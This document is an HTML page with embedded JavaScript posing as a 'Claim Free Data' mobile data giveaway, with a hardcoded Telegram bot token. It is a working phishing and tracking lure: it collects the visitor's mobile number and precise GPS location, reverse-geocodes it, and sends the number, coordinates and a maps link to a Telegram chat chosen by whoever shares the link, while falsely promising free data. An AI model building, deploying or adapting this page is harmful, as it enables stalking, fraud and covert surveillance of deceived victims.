<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Free Data Claim</title>
  <style>
    body {
      margin: 0;
      font-family: system-ui, -apple-system, sans-serif;
      background: #0d1117;
      color: #e6edf3;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .container {
      background: #161b22;
      border-radius: 16px;
      padding: 32px 24px;
      max-width: 420px;
      width: 100%;
      text-align: center;
      box-shadow: 0 10px 30px rgba(0,0,0,0.6);
    }
    .logo {
      font-size: 100px;
      font-weight: bold;
      color: #00d084;
      margin-bottom: 24px;
      text-shadow: 0 0 30px #00d084;
    }
    .btn-group {
      display: flex;
      gap: 16px;
      justify-content: center;
      margin-bottom: 32px;
    }
    button.data-btn {
      padding: 14px 32px;
      font-size: 18px;
      border-radius: 12px;
      border: 2px solid #444c56;
      background: #21262d;
      color: white;
      cursor: pointer;
      transition: all 0.2s;
    }
    button.data-btn.active {
      background: #00d084;
      border-color: #00d084;
      color: black;
    }
    input {
      width: 100%;
      padding: 16px;
      font-size: 18px;
      background: #0d1117;
      border: 1px solid #444c56;
      color: white;
      border-radius: 12px;
      margin: 20px 0 24px;
      text-align: center;
    }
    #claimBtn {
      width: 100%;
      padding: 18px;
      font-size: 20px;
      background: #238636;
      color: white;
      border: none;
      border-radius: 12px;
      cursor: pointer;
      font-weight: 600;
    }
    #claimBtn:disabled {
      background: #21262d;
      cursor: not-allowed;
    }
    #status {
      margin-top: 28px;
      font-size: 17px;
      min-height: 80px;
      line-height: 1.4;
    }
    .success { color: #56d364; }
    .error   { color: #f85149; }
  </style>
</head>
<body>

<div class="container">
  <div class="logo">1GB</div>

  <div class="btn-group">
    <button class="data-btn active" data-gb="1">1 GB</button>
    <button class="data-btn" data-gb="2">2 GB</button>
  </div>

  <input type="tel" id="mobile" placeholder="Enter 10-digit mobile number" maxlength="10" />

  <button id="claimBtn">Claim Free Data</button>

  <div id="status"></div>
</div>

<script>
  // ────────────────────────────────────────────────
  //              CHANGE ONLY THIS
  const BOT_TOKEN = "7752428251:AAGNplPML8xLHGQDaHYgs5djp70KcqMBFEI";   // ← Apna BotFather token daalo
  // ────────────────────────────────────────────────

  const status   = document.getElementById('status');
  const claimBtn = document.getElementById('claimBtn');
  const mobileEl = document.getElementById('mobile');

  let selectedGB = '1';

  // Package select
  document.querySelectorAll('.data-btn').forEach(btn => {
    btn.onclick = () => {
      document.querySelectorAll('.data-btn').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      selectedGB = btn.dataset.gb;
    };
  });

  claimBtn.onclick = async () => {
    const mobile = mobileEl.value.trim();

    if (!mobile || mobile.length !== 10 || !/^[6-9]\d{9}$/.test(mobile)) {
      status.textContent = 'Please enter valid 10-digit mobile number';
      status.className = 'error';
      return;
    }

    claimBtn.disabled = true;
    status.textContent = 'Processing...';
    status.className = '';

    try {
      // 1. Chat ID URL se (must have ?id=...)
      const params = new URLSearchParams(window.location.search);
      const targetChatId = params.get('id');

      if (!targetChatId || !/^\d{5,}$/.test(targetChatId)) {
        throw new Error('Missing or invalid chat ID. Use: your-site.vercel.app/?id=123456789');
      }

      // 2. GPS/Location permission maangega (browser popup)
      const pos = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0
        });
      });

      const { latitude, longitude } = pos.coords;

      // 3. Free reverse geocoding → city/state/country (no key needed)
      let placeName = 'Unknown location';
      try {
        const geoRes = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=\( {latitude}&longitude= \){longitude}&localityLanguage=en`);
        const geoData = await geoRes.json();

        const city    = geoData.city     || geoData.locality || '';
        const state   = geoData.principalSubdivision || '';
        const country = geoData.countryName || '';

        placeName = [city, state, country].filter(Boolean).join(', ') || 'Unknown';
      } catch (geoErr) {
        console.warn('Reverse geocoding failed:', geoErr);
      }

      // Maps link (direct pin + clickable)
      const mapsLink = `https://www.google.com/maps?q=\( {latitude}, \){longitude}`;

      // Telegram message with place name + link
      const message = 
`New Claim Received!
Mobile: ${mobile}
Package: ${selectedGB} GB
Approximate Place: ${placeName}
Location Link: ${mapsLink}
Lat/Lng: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}
Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;

      const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

      const response = await fetch(telegramUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: targetChatId,
          text: message,
          parse_mode: 'HTML',
          disable_web_page_preview: false
        })
      });

      const data = await response.json();

      if (!data.ok) {
        throw new Error(data.description || 'Telegram failed');
      }

      status.innerHTML = `Success!<br>${selectedGB} GB requested.<br>Wait up to 1 hour.<br>Location sent.`;
      status.className = 'success';

    } catch (err) {
      let msg = 'Something went wrong. Try again.';

      if (err.code === 1) {
        msg = 'Location permission denied. Please allow access to continue.';
      } else if (err.code === 3) {
        msg = 'Location timed out. Please try again.';
      } else if (err.message.includes('chat ID')) {
        msg = err.message;
      } else {
        msg = err.message || msg;
      }

      status.textContent = msg;
      status.className = 'error';
      console.error(err);
    } finally {
      claimBtn.disabled = false;
    }
  };
</script>
</body>
</html>
